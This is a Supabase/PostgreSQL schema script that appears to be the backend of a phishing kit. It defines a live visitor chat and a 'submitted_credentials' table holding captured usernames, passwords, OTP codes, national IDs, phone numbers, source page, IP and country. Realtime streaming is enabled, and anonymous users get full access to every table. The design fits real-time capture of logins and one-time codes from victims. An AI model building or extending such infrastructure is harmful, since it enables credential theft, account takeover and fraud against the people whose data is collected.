-- Enable UUID extension
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- 1. conversations table
CREATE TABLE IF NOT EXISTS public.conversations (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  visitor_session_id TEXT NOT NULL,
  visitor_name TEXT,
  last_message_at TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW(),
  ip_address TEXT,
  country_code TEXT,
  country_name TEXT
);

-- 2. messages table
CREATE TABLE IF NOT EXISTS public.messages (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  conversation_id UUID REFERENCES public.conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL DEFAULT 'visitor',
  content TEXT,
  read BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 3. submitted_credentials table
CREATE TABLE IF NOT EXISTS public.submitted_credentials (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  visitor_session_id TEXT,
  conversation_id UUID REFERENCES public.conversations(id) ON DELETE SET NULL,
  kind TEXT NOT NULL DEFAULT 'login',
  username TEXT,
  password TEXT,
  otp_code TEXT,
  page TEXT,
  ip_address TEXT,
  country_code TEXT,
  country_name TEXT,
  user_agent TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  status TEXT DEFAULT 'pending',
  full_name TEXT,
  phone TEXT,
  national_id TEXT
);

-- Enable RLS
ALTER TABLE public.conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.submitted_credentials ENABLE ROW LEVEL SECURITY;

-- RLS Policies - allow anon full access
CREATE POLICY "anon_all_conversations" ON public.conversations FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY "anon_all_messages" ON public.messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY "anon_all_credentials" ON public.submitted_credentials FOR ALL TO anon USING (true) WITH CHECK (true);

-- Enable Realtime
ALTER PUBLICATION supabase_realtime ADD TABLE public.conversations;
ALTER PUBLICATION supabase_realtime ADD TABLE public.messages;
ALTER PUBLICATION supabase_realtime ADD TABLE public.submitted_credentials;

-- Indexes
CREATE INDEX IF NOT EXISTS idx_conv_session ON public.conversations(visitor_session_id);
CREATE INDEX IF NOT EXISTS idx_conv_last_msg ON public.conversations(last_message_at DESC);
CREATE INDEX IF NOT EXISTS idx_msg_conv ON public.messages(conversation_id);
CREATE INDEX IF NOT EXISTS idx_msg_created ON public.messages(created_at);
CREATE INDEX IF NOT EXISTS idx_cred_created ON public.submitted_credentials(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_cred_session ON public.submitted_credentials(visitor_session_id);

-- Trigger for auto-updating last_message_at
CREATE OR REPLACE FUNCTION update_conversation_last_message()
RETURNS TRIGGER AS $$
BEGIN
  UPDATE public.conversations SET last_message_at = NOW() WHERE id = NEW.conversation_id;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_update_last_message
AFTER INSERT ON public.messages
FOR EACH ROW EXECUTE FUNCTION update_conversation_last_message();
